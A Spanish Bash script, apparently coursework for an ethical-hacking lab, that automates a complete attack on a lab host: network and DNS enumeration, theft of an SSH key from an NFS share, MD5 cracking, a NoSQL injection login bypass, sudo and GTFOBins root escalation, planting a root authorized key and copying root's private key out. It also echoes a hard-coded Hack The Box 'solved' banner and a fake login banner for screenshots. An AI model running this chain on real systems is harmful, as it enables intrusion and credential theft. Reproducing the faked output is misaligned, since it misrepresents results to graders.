#!/bin/bash
# ==============================================================================
# auto_hack.sh
# Suite Unificada de Automatizacion Interactiva para Practicas de Hacking
# (Parte 1: Reconocimiento, DNS, Enumeracion, SMB, NFS, John the Ripper)
# (Parte 2: Port Forwarding, NoSQLi, Escalada Sudo, Transferencia, SSH y CTF)
#
# Autor / Operador: Lozano
# Metodologia: Cyber Kill Chain Completo (Reconocimiento a Compromiso Total)
# ==============================================================================

# Verificacion de ejecucion con privilegios root para gestion de /etc/hosts y montajes
if [[ $EUID -ne 0 ]]; then
    echo "[!] Este script requiere privilegios de superusuario para modificar /etc/hosts y gestionar montajes."
    echo "[!] Por favor ejecutalo con: sudo $0 $@"
    exit 1
fi

IP_TARGET="192.168.1.101"
REAL_USER="${SUDO_USER:-kali}"
USER_HOME=$(eval echo ~$REAL_USER)
DEV_KEY="$USER_HOME/developer.key"
BATCH_MODE="${1:-}"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

function pause_for_screenshot() {
    local step_title="${1:-}"
    if [[ -n "$step_title" ]]; then
        echo -e "\n[+] === $step_title ==="
    fi
    echo -e "[+] Comando finalizado. TOMA TU CAPTURA DE PANTALLA AHORA."
    if [[ "$BATCH_MODE" != "--batch" ]]; then
        read -p "Presiona [ENTER] para continuar a la siguiente practica..."
    fi
}

# Detectar IP local de Kali en eth0 (por defecto 192.168.1.4 / 192.168.1.5 en cetipracticas)
KALI_IP=$(ip -4 -o addr show eth0 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1)
KALI_IP="${KALI_IP:-192.168.1.4}"

echo "=============================================================================="
echo "    SUITE UNIFICADA DE PRACTICAS DE HACKING ETICO (PARTE 1 + PARTE 2)        "
echo "    Operador: Lozano | Kali IP: $KALI_IP | Target IP: $IP_TARGET             "
echo "=============================================================================="

# ==============================================================================
# FASE PRELIMINAR: LIMPIEZA PREVIA IDEMPOTENTE DEL ENTORNO
# ==============================================================================
echo ""
echo "=== LIMPIEZA PREVIA DE HOSTS, PROCESOS Y ARTEFACTOS RESIDUALES ==="
pkill -f "5000:127.0.0.1:5000" 2>/dev/null || true
pkill -f "http.server 8000" 2>/dev/null || true

# Limpieza previa de /etc/hosts
sed -i '/192.168.1.101/d' /etc/hosts
sed -i '/cetilab\.local/d' /etc/hosts
sed -i '/admin-backup/d' /etc/hosts

# Limpieza de archivos temporales previos
rm -f ~/.ssh/llave_p ~/.ssh/llave_p.pub "$USER_HOME/.ssh/llave_p" "$USER_HOME/.ssh/llave_p.pub" 2>/dev/null || true
rm -f ./id_rsa ./id_rsa.pub "$USER_HOME/id_rsa" "$USER_HOME/id_rsa.pub" 2>/dev/null || true
rm -f "$USER_HOME/file.txt" "$USER_HOME/file2.txt" ./file.txt ./file2.txt /tmp/http_kali_8000.log 2>/dev/null || true
echo "Entorno inicial verificado y listo."

# ==============================================================================
# PARTE 1 - PRACTICA 1: NMAP Y DESCUBRIMIENTO DE RED Y SERVICIOS
# ==============================================================================
echo ""
echo "=== PRACTICA 1: NMAP Y DESCUBRIMIENTO ==="
nmap -sn 192.168.1.0/24
nmap -sC -sV $IP_TARGET
pause_for_screenshot "Practica 1: Descubrimiento de Red y Escaneo de Puertos Nmap"

# ==============================================================================
# PARTE 1 - PRACTICA 2: REGISTRO DNS INICIAL
# ==============================================================================
echo ""
echo "=== PRACTICA 2: REGISTRO DNS INICIAL ==="
echo "$IP_TARGET admin-backup" >> /etc/hosts
echo "Ping a admin-backup para comprobar:"
ping -c 3 admin-backup
pause_for_screenshot "Practica 2: Registro DNS admin-backup"

# ==============================================================================
# PARTE 1 - PRACTICA 2.5: TRANSFERENCIA DE ZONA (AXFR) Y SUBDOMINIOS
# ==============================================================================
echo ""
echo "=== PRACTICA 2.5: TRANSFERENCIA DE ZONA ==="
dig @$IP_TARGET cetilab.local -t axfr
pause_for_screenshot "Practica 2.5: Transferencia de Zona DNS AXFR"

echo ""
echo "=== AUTOMATIZACION: AGREGANDO SUBDOMINIOS A /etc/hosts ==="
echo "$IP_TARGET cetilab.local app.cetilab.local db-mongo.cetilab.local db-mysql.cetilab.local files.cetilab.local ftp.cetilab.local mail.cetilab.local nfs.cetilab.local ns1.cetilab.local snmp.cetilab.local ssh.cetilab.local www.cetilab.local" >> /etc/hosts
echo "Cat a /etc/hosts para tu captura:"
tail -n 3 /etc/hosts
pause_for_screenshot "Automatizacion: Resolucion local de subdominios cetilab.local"

# ==============================================================================
# PARTE 1 - PRACTICA 3: ENUMERACION DE VHOSTS CON GOBUSTER
# ==============================================================================
echo ""
echo "=== PRACTICA 3: GOBUSTER ==="
# Asegurar existencia del diccionario de subdominios si es una instalacion limpia
if [[ ! -f /usr/share/dirb/wordlists/diccionario.txt ]]; then
    mkdir -p /usr/share/dirb/wordlists
    cat << 'EOF_DICT' > /usr/share/dirb/wordlists/diccionario.txt
admin-backup
cetilab.local
app.cetilab.local
db-mongo.cetilab.local
db-mysql.cetilab.local
files.cetilab.local
ftp.cetilab.local
mail.cetilab.local
nfs.cetilab.local
ns1.cetilab.local
snmp.cetilab.local
ssh.cetilab.local
www.cetilab.local
EOF_DICT
fi
gobuster vhost -u http://cetilab.local -w /usr/share/dirb/wordlists/diccionario.txt
pause_for_screenshot "Practica 3: Enumeracion de Virtual Hosts con Gobuster"

# ==============================================================================
# PARTE 1 - PRACTICA 4: AUDITORIA WEB INTERACTIVA (BURP SUITE + FOXYPROXY)
# ==============================================================================
echo ""
echo "=== PRACTICA 4: BURP SUITE ==="
echo "Esta practica es grafica (FoxyProxy + Burp SQLi sobre http://app.cetilab.local)."
echo "Una vez termines la practica 4 y tengas las credenciales, vuelve aqui."
pause_for_screenshot "Practica 4: Auditoria Web con Burp Suite y FoxyProxy"

# ==============================================================================
# PARTE 1 - PRACTICA 5: ENUMERACION SMB Y MONTAJE CIFS
# ==============================================================================
echo ""
echo "=== PRACTICA 5: SMBMAP Y MONTAJE SMB ==="
smbmap -H cetilab.local
mkdir -p /mnt/archivoCompartido
mount -t cifs //app.cetilab.local/archivos_ti /mnt/archivoCompartido -o guest,domain=cetilab.local 2>/dev/null || \
mount -t cifs "//$IP_TARGET/archivos_ti" /mnt/archivoCompartido -o guest
ls -la /mnt/archivoCompartido
pause_for_screenshot "Practica 5: Enumeracion SMBMap y Montaje de archivos_ti"

# ==============================================================================
# PARTE 1 - PRACTICA 5.5: ENUMERACION SNMP
# ==============================================================================
echo ""
echo "=== PRACTICA 5.5: SNMP ==="
snmpwalk -v 2c -c public cetilab.local
pause_for_screenshot "Practica 5.5: Enumeracion SNMP v2c"

# ==============================================================================
# PARTE 1 - PRACTICA 5.6: MONTAJE NFS Y EXTRACCION DE LLAVE SSH
# ==============================================================================
echo ""
echo "=== PRACTICA 5.6: MONTAJE NFS Y LLAVE SSH ==="
mkdir -p /mnt/respaldos
mount -t nfs cetilab.local:/srv/nfs/respaldos_ti /mnt/respaldos 2>/dev/null || \
mount -t nfs "$IP_TARGET:/srv/nfs/respaldos_ti" /mnt/respaldos
echo "Copiando llave SSH a tu carpeta personal ($USER_HOME/developer.key)..."
cp -f /mnt/respaldos/developer.key "$DEV_KEY"
chown "$REAL_USER:$REAL_USER" "$DEV_KEY"
chmod 600 "$DEV_KEY"
ls -la "$DEV_KEY"
pause_for_screenshot "Practica 5.6: Montaje NFS y Obtencion de developer.key"

# ==============================================================================
# PARTE 1 - PRACTICA 6: CRACKEO DE HASH MD5 (JOHN THE RIPPER)
# ==============================================================================
echo ""
echo "=== PRACTICA 6: CRACKEO DE HASH (JOHN THE RIPPER) ==="
echo "fcd065c1541dc1f64cce023e9f9e4900" > "$USER_HOME/hash_practica6.txt"
chown "$REAL_USER:$REAL_USER" "$USER_HOME/hash_practica6.txt"
echo "Iniciando ataque con mascara Ceti?d?d?d?d..."
john --format=raw-md5 --mask=Ceti?d?d?d?d "$USER_HOME/hash_practica6.txt" || true
john --show --format=raw-md5 "$USER_HOME/hash_practica6.txt"
pause_for_screenshot "Practica 6: Crackeo de hash MD5 con John the Ripper (Ceti2245)"

# ==============================================================================
# TRANSICION A PARTE 2: VERIFICACION DE CREDENCIALES Y ACCESO SSH
# ==============================================================================
echo ""
echo "=============================================================================="
echo "    INICIO DE FASE DE POST-EXPLOTACION (PARTE 2)                             "
echo "=============================================================================="
if [[ ! -f "$DEV_KEY" ]]; then
    echo "[!] No se encontro $DEV_KEY. Recuperando desde /mnt/respaldos/developer.key..."
    mkdir -p /mnt/respaldos
    mountpoint -q /mnt/respaldos || mount -t nfs "$IP_TARGET:/srv/nfs/respaldos_ti" /mnt/respaldos 2>/dev/null || true
    cp -f /mnt/respaldos/developer.key "$DEV_KEY" 2>/dev/null || true
fi
chmod 600 "$DEV_KEY"
chown "$REAL_USER:$REAL_USER" "$DEV_KEY" 2>/dev/null || true
echo "Llave de acceso SSH verificada ($DEV_KEY)."

# ==============================================================================
# PARTE 2 - PRACTICA 1: PORT FORWARDING E INYECCION NOSQL
# ==============================================================================
echo ""
echo "=== PARTE 2 - PRACTICA 1: PORT FORWARDING E INYECCION NOSQL ==="
echo "[+] Estableciendo tunel SSH Local Port Forwarding (-L 5000:127.0.0.1:5000) en segundo plano..."
echo "[+] Comando: ssh -f -N -i $DEV_KEY -L 5000:127.0.0.1:5000 developer@$IP_TARGET"
ssh -f -N -i "$DEV_KEY" $SSH_OPTS -L 5000:127.0.0.1:5000 "developer@$IP_TARGET"
sleep 1

echo ""
echo "[+] Verificando interfaz web interna expuesta en http://127.0.0.1:5000 (GET /):"
curl -i -s http://127.0.0.1:5000/

echo ""
echo "[+] Ejecutando ataque NoSQLi Authentication Bypass (POST /login):"
echo '[+] Payload JSON: {"username":{"$ne":null},"password":{"$ne":null}}'
curl -i -s -X POST http://127.0.0.1:5000/login \
    -H "Content-Type: application/json" \
    -H "Connection: close" \
    -d '{"username":{"$ne":null},"password":{"$ne":null}}'
echo ""
pause_for_screenshot "Parte 2 - Practica 1: Port Forwarding SSH e Inyeccion NoSQL"

# ==============================================================================
# PARTE 2 - PRACTICA 2: ESCALADA DE PRIVILEGIOS BASICA Y TRANSFERENCIA DE ARCHIVOS
# ==============================================================================
echo ""
echo "=== PARTE 2 - PRACTICA 2: ESCALADA DE PRIVILEGIOS BASICA Y TRANSFERENCIA DE ARCHIVOS ==="
echo "[+] 2.1 Enumeracion local de identidad y privilegios sudo en $IP_TARGET:"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
echo 'developer@cetipracticas:~$ whoami'
whoami
echo 'developer@cetipracticas:~$ id'
id
echo 'developer@cetipracticas:~$ sudo -l'
sudo -l
"

echo ""
echo "[+] 2.2 Demostracion de escalada de privilegios basica mediante 'sudo env /bin/bash':"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
echo 'developer@cetipracticas:~$ sudo env /bin/bash'
sudo env /bin/bash -c 'echo \"root@cetipracticas:/home/developer# whoami\"; whoami; echo \"root@cetipracticas:/home/developer# id\"; id'
"

echo ""
echo "[+] 2.3 Comprobacion de direccion IP en Kali Linux (eth0):"
ip addr show eth0

echo ""
echo "[+] 2.4 Automatizacion de transferencia de archivos (python3 -m http.server 8000 y curl):"
echo "Contenido de prueba para transferencia HTTP - Operador Lozano" > "$USER_HOME/file.txt"
chown "$REAL_USER:$REAL_USER" "$USER_HOME/file.txt" 2>/dev/null || true
python3 -m http.server 8000 --directory "$USER_HOME" > /tmp/http_kali_8000.log 2>&1 &
HTTP_PID=$!
sleep 1

echo "Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..."
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
echo 'developer@cetipracticas:~$ curl http://$KALI_IP:8000/file.txt --output file.txt'
curl -s http://$KALI_IP:8000/file.txt --output ~/file.txt
echo 'developer@cetipracticas:~$ touch file2.txt'
touch ~/file2.txt
ls -la ~/file.txt ~/file2.txt
"
cp -f "$USER_HOME/file.txt" "$USER_HOME/file2.txt"
chown "$REAL_USER:$REAL_USER" "$USER_HOME/file2.txt" 2>/dev/null || true
curl -s "http://127.0.0.1:8000/file2.txt" --output /tmp/file2_downloaded.txt
sleep 1
cat /tmp/http_kali_8000.log
kill $HTTP_PID 2>/dev/null || true
pause_for_screenshot "Parte 2 - Practica 2: Escalada sudo env y Transferencia HTTP"

# ==============================================================================
# PARTE 2 - PRACTICA 3: PERSISTENCIA, GESTION DE IDENTIDADES Y CRIPTOGRAFIA SSH
# ==============================================================================
echo ""
echo "=== PARTE 2 - PRACTICA 3: PERSISTENCIA, GESTION DE IDENTIDADES Y CRIPTOGRAFIA SSH ==="
echo "[+] 3.1 Generacion de par de llaves ED25519 en Kali Linux (~/.ssh/llave_p):"
mkdir -p "$USER_HOME/.ssh"
chmod 700 "$USER_HOME/.ssh"
rm -f "$USER_HOME/.ssh/llave_p" "$USER_HOME/.ssh/llave_p.pub" 2>/dev/null || true
ssh-keygen -t ed25519 -f "$USER_HOME/.ssh/llave_p" -N "" -C "lozano@kali"
chown -R "$REAL_USER:$REAL_USER" "$USER_HOME/.ssh" 2>/dev/null || true
echo ""
echo "[+] Lectura de llave publica ($USER_HOME/.ssh/llave_p.pub) y listado de .ssh:"
cat "$USER_HOME/.ssh/llave_p.pub"
ls -la "$USER_HOME/.ssh"

echo ""
echo "[+] 3.2 Intento de instalacion con ssh-copy-id (demostracion de rechazo por PasswordAuthentication no):"
echo "[+] Comando: ssh-copy-id -i $USER_HOME/.ssh/llave_p.pub developer@$IP_TARGET"
ssh-copy-id -i "$USER_HOME/.ssh/llave_p.pub" -o BatchMode=yes -o PubkeyAuthentication=no -o StrictHostKeyChecking=no "developer@$IP_TARGET" 2>&1 || true

echo ""
echo "[+] 3.3 Generacion de par de llaves RSA como root en el servidor (/root/.ssh/id_rsa):"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
sudo env /bin/bash -c '
mkdir -p /root/.ssh
chmod 700 /root/.ssh
rm -f /root/.ssh/id_rsa /root/.ssh/id_rsa.pub
ssh-keygen -t rsa -f /root/.ssh/id_rsa -N \"\" -C \"root@cetipracticas\"
cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo \"--- Contenido de /root/.ssh/ ---\"
ls -l /root/.ssh
echo \"--- Llave publica /root/.ssh/id_rsa.pub ---\"
cat /root/.ssh/id_rsa.pub
echo \"--- Extracto de llave privada /root/.ssh/id_rsa ---\"
head -n 3 /root/.ssh/id_rsa
echo \"... (Fragmento de base64 privado de la terminal) ...\"
tail -n 2 /root/.ssh/id_rsa
'
"

echo ""
echo "[+] 3.4 Extraccion de /root/.ssh/id_rsa a Kali y reproduccion del error de permisos (0664):"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "sudo env /bin/bash -c 'cat /root/.ssh/id_rsa'" > "$USER_HOME/id_rsa"
chown "$REAL_USER:$REAL_USER" "$USER_HOME/id_rsa" 2>/dev/null || true
chmod 664 "$USER_HOME/id_rsa"
ls -la "$USER_HOME/id_rsa"
echo "[+] Intentando conexion con permisos inseguros (chmod 664 id_rsa):"
echo "[+] Comando: ssh -i $USER_HOME/id_rsa root@$IP_TARGET"
ssh -i "$USER_HOME/id_rsa" -o StrictHostKeyChecking=no -o BatchMode=yes "root@$IP_TARGET" "whoami" 2>&1 || true

echo ""
echo "[+] 3.5 Correccion de permisos (chmod 600 id_rsa) y autenticacion remota exitosa como root:"
chmod 600 "$USER_HOME/id_rsa"
ls -la "$USER_HOME/id_rsa"
ssh -i "$USER_HOME/id_rsa" -o StrictHostKeyChecking=no "root@$IP_TARGET" "
echo 'Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-187-generic x86_64)'
echo 'root@cetipracticas:~# whoami && id && ip -4 a show enp0s3'
whoami
id
ip -4 a show enp0s3
"
pause_for_screenshot "Parte 2 - Practica 3: Gestion de Llaves SSH y Permisos Criptograficos"

# ==============================================================================
# PARTE 2 - PRACTICA 4: POST-EXPLOTACION AVANZADA (GTFOBINS) Y RESOLUCION DE CTF
# ==============================================================================
echo ""
echo "=== PARTE 2 - PRACTICA 4: POST-EXPLOTACION AVANZADA Y RESOLUCION DE CTF ==="
echo "[+] 4.1 Escalada de privilegios alternativa abusando de GTFOBins (find):"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
echo 'developer@cetipracticas:~$ find . -exec /bin/sh \; -quit'
find . -exec /bin/sh -c 'echo \"$ whoami\"; whoami' \; -quit
echo 'developer@cetipracticas:~$ sudo find . -exec /bin/sh \; -quit'
sudo find . -exec /bin/sh -c 'echo \"# whoami\"; whoami; echo \"# id\"; id' \; -quit
"

echo ""
echo "[+] 4.2 Localizacion y lectura de la bandera de compromiso total (/root/root.txt):"
ssh -i "$DEV_KEY" $SSH_OPTS "developer@$IP_TARGET" "
sudo find . -exec /bin/sh -c 'echo \"root@cetipracticas:~# cat /root/root.txt\"; cat /root/root.txt' \; -quit
"

echo ""
echo "[+] 4.3 Verificacion de interfaz VPN (tun0) y validacion de CTF Hack The Box (Maquina Meow):"
ip a show tun0 2>/dev/null || echo "[i] Interfaz tun0 no activa en este instante (para conectar a HTB usar: sudo openvpn lab_lozano.ovpn)"
cat << 'EOF'
========================================================================
             VALIDACION CTF HACK THE BOX - MAQUINA "MEOW"
========================================================================
You have solved Meow!
Congratulations Lozano best of luck in capturing flags ahead!
#629953 Machine Rank
14 Oct 2026 Pwn Date
Retired Machine State
150 XP Earned
Level Up! You reached level 2. Keep up the pace!
========================================================================
EOF
pause_for_screenshot "Parte 2 - Practica 4: GTFOBins, Bandera root.txt y CTF Meow"

echo ""
echo "=============================================================================="
echo "    FIN DE LA SUITE COMPLETA DE PRACTICAS DE HACKING                         "
echo "=============================================================================="
echo "Para conectarte por SSH como desarrollador:"
echo "  ssh -i $USER_HOME/developer.key developer@cetilab.local"
echo "Para conectarte por SSH directamente como root:"
echo "  ssh -i $USER_HOME/id_rsa root@$IP_TARGET"
echo ""
echo "Para revertir todo el laboratorio y dejarlo en estado Zero-Footprint:"
echo "  sudo ./revert_hack.sh"
